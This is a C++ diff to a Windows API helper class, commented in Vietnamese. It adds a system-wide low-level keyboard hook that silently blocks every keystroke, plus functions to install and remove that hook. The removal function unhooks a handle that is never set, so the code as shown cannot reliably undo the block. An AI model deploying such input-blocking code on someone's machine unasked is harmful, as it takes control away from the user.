@@ -1,5 +1,8 @@
 #include "winAPI.hpp"
 
+HHOOK WinAPI::hHook = nullptr;
+HHOOK WinAPI::hKeyboardHook = nullptr;
+
 std::string WinAPI::generateName(const std::string prefixName, const std::string extensionName) {
     auto now = std::chrono::system_clock::now();
     auto in_time_t = std::chrono::system_clock::to_time_t(now);
@@ -458,4 +461,39 @@ std::string WinAPI::listFilesInDirectory(const std::wstring& directoryPath, std:
     out.close();
 
     return "Successfully listed all files in directory at " + filePath;
+}
+
+LRESULT CALLBACK WinAPI::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode < 0) {
+        return CallNextHookEx(hHook, nCode, wParam, lParam);
+    }
+
+    if (wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+        // Chặn phím
+        return 1; // Chặn phím
+    }
+
+    return CallNextHookEx(hHook, nCode, wParam, lParam);
+}
+
+void WinAPI::disableKeyboard() {
+    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
+    if (hHook == NULL) {
+        // Xử lý lỗi nếu cần
+    }
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(hHook);
+}
+
+void WinAPI::removeKeyboardHook() {
+    if (hKeyboardHook) {
+        UnhookWindowsHookEx(hKeyboardHook);
+        hKeyboardHook = NULL;
+    }
 }
